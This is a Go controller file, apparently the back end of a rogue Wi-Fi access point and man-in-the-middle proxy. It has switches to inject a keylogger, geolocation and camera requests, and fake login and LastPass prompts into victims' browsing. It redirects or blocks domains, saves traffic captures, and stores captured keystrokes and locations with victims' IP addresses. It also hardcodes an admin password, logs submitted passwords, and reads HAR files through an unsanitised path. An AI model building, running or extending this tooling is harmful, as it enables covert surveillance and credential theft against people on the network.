package controllers

import (
	"github.com/revel/revel"
	"log"
	"io/ioutil"
	"os/exec"
	"path/filepath"
	"time"
	"strings"
	"net"
)

const (
    PASSWORD = "whitesilence"
    SECURE = false
)

type App struct {
	*revel.Controller
}


func InitiateProxy() {
    //set the location for files
    log.Println("loading storage location")
    setFileStorageLocation()
    //get the redirect pages from server
    log.Println("downloading files")
    getPages()
    //get a list of urls to redirect
    log.Println("creating redirections...")
    getRedirectUrls()
    //get a list of urls to block
    log.Println("get blocked urls...")
    getBannedUrls()
    log.Println("get news sites")
    getNewsUrls()
    //reset all parameters for the proxy
	globalStoreHAR = false			
	globalProxyStandard = false
	globalRedirects = false
	globalBlocks = false
	globalWolfPack = false
	
	//reset scripts
	globalInjectKeyLogger = false
	globalInjectGetLocation  = false
	globalInjectGetPhoto = false
	globalInjectGetLogin = false
	globalInjectLastpass = false

	//turn on the basic proxy
	globalProxyStandard = true
}

func (c App) Login() revel.Result {
	var p string
	c.Params.Bind(&p, "password")
	log.Println("password: ", p)
	if p == PASSWORD {
		password = p
		return c.Redirect("/App/Index")
	}
	return c.Render()
}

//
func (c App) Index() revel.Result {

	StartSimpleProxy()
	return c.Render()

}

func (c App) StartSimpleProxy() revel.Result {
	// Kill the proxy anyways.
	KillProxy()
	// If the proxy was off, start a new one.
	if globalProxyStandard == false {
		globalProxyStandard = true
		StartSimpleProxy()
		log.Println("Proxy started")
		return c.RenderJson("{Proxy:'Started'}")
	} else {
		globalProxyStandard = false
	}
	// Return 
	log.Println("Proxy shutting down")
	return c.RenderJson("{Proxy:'restarted}")
}

// Function to kill the proxy.
func KillProxy() {
	// if stoppableListener != nil {
	var err error
		stoppableListener.Close()
		log.Println("waiting for socket to close")

	    wg.Wait()
        listener, err = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT) 
	    if err != nil {
	        log.Println("error here: ", err)
	    }   
}

func (c App) ToggleHarCollection() revel.Result {
	globalStoreHAR = !globalStoreHAR
	log.Println(" --- OPTION: Toggling har collection: ", globalStoreHAR)
	return c.RenderJson(globalStoreHAR)
}

// Function that redirects specific domains.
func (c App) TriggerRedirects() revel.Result {
	if globalRedirects == false {
		globalRedirects = true
		log.Println(" --- OPTION: Turning on redirects")
		log.Println("     ", redirect)
	} else {
		globalRedirects = false
		log.Println(" --- OPTION: Turning off redirects")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson(redirect) // Return list of redirects.
}

// Function that redirects specific domains.
func (c App) TriggerBlocks() revel.Result {
	if globalBlocks == false {
		globalBlocks = true
		log.Println(" --- OPTION: Turning on blocking")
		log.Println("     ", banned)
	} else {
		globalBlocks = false
		log.Println(" --- OPTION: Turning off blocking")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson(banned) // Return list of redirects.
}

func (c App) TriggerWolfPack() revel.Result {
	if globalWolfPack == false {
		globalWolfPack = true
		log.Println(" --- OPTION: Turning on wolf-pack-hack")
	} else {
		globalWolfPack = false
		log.Println(" --- OPTION: Turning off wolf-pack-hack")
	}
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson("") // Return list of redirects.
}

//
func (c App) TriggerInjection() revel.Result {
	// Get the replace and result.
	var trigger string
	//
	c.Params.Bind(&trigger, "trigger")
	//
	if trigger == "keylogger" {
		if globalInjectKeyLogger == false {
			globalInjectKeyLogger = true
			log.Println(" --- OPTION: Turning on key-logger")
		} else {
			globalInjectKeyLogger = false
			log.Println(" --- OPTION: Turning off key-logger")
		}
	} else if trigger == "getlocation" {
		if globalInjectGetLocation == false {
			globalInjectGetLocation = true
			log.Println(" --- OPTION: Turning on Location Request")
		} else {
			globalInjectGetLocation = false
			log.Println(" --- OPTION: Turning on Location Request")
		}
	} else if trigger == "takephoto" {
		if globalInjectGetPhoto == false {
			globalInjectGetPhoto = true
			log.Println(" --- OPTION: Turning on Photo Request")
		} else {
			globalInjectGetPhoto = false
			log.Println(" --- OPTION: Turning on Photo Request")
		}
	} else if trigger == "requestlogin" {
		if globalInjectGetLogin == false {
			globalInjectGetLogin = true
			log.Println(" --- OPTION: Turning on Login Request")
		} else {
			globalInjectGetLogin = false
			log.Println(" --- OPTION: Turning on Login Request")
		}
	} else if trigger == "requestlasspass" {
		if globalInjectLastpass == false {
			globalInjectLastpass = true
			log.Println(" --- OPTION: Turning on Login Request")
		} else {
			globalInjectLastpass = false
			log.Println(" --- OPTION: Turning on Login Request")
		}
	} 
	KillProxy()
	StartSimpleProxy()
	return c.RenderJson("")
}

func (c App) CreateAccessPoint() revel.Result {
	var apName string
	c.Params.Bind(&apName, "name")

	cmd := exec.Command("sudo", "/srv/wifi/beagleattach.sh", "eth0", apName)
	output, _ := cmd.CombinedOutput()
	return c.RenderJson(output)
}


func (c App) GetLocations() revel.Result {
	return c.RenderJson(locations)
}
func (c App) CatchLocation() revel.Result {
	var lat string
	var lon string
	c.Params.Bind(&lat, "latitude")
	c.Params.Bind(&lon, "longitude")
	var l Location
	l.Latitude = lat
	l.Longitude = lon
	t := time.Now().Local()
	l.Timestamp = t.Format("20060102150405")
	s := strings.Split(c.Request.RemoteAddr, ":")
	ip := s[0]
	l.IP = ip
	locations = append(locations, l)
	return c.RenderJson("location updated")
}


func (c App) GetKeylogs() revel.Result {
	return c.RenderJson(keylogs)
}

func (c App) CatchKeyLog() revel.Result {
	var d string
	var p string
	var o string
	c.Params.Bind(&d, "data")
	c.Params.Bind(&p, "page")
	c.Params.Bind(&o, "object")
	if d != "" {
		var k KeyLog
		k.Page = p
		k.Content = d
		t := time.Now().Local()
		k.Timestamp = t.Format("20060102150405")
		s := strings.Split(c.Request.RemoteAddr, ":")
		k.DomObject = o
		ip := s[0]
		k.IP = ip
		keylogs = append(keylogs, k)
		return c.RenderJson("logger updated")
	}
	return c.RenderJson("null")
}

func (c App) GetHars() revel.Result {
	var fileNames []string
	log.Println("reading hars from: ", fileLocation+"/hars/")
	files, err := ioutil.ReadDir(fileLocation+"/hars/")
	if err != nil {
		log.Println("error: ", err)
	}
	for _, f := range files {
		log.Println(f.Name())
        fileNames = append(fileNames, f.Name())
    }
	return c.RenderJson(fileNames)
}

func (c App) GetHar() revel.Result {
	var harName string
	c.Params.Bind(&harName, "harname")
    data, err := ioutil.ReadFile(fileLocation+"/hars/"+harName)
    log.Println("location: ", fileLocation+"/hars/"+harName)
    if err != nil {
    	return c.RenderJson("The file may not exist...")
    }
    return c.RenderJson(string(data))
}
func (c App) DeleteHars() revel.Result {
	var w Walker
	filepath.Walk(fileLocation+"/hars", w.utilsDeletefiles)
	return c.RenderJson(w.files)
}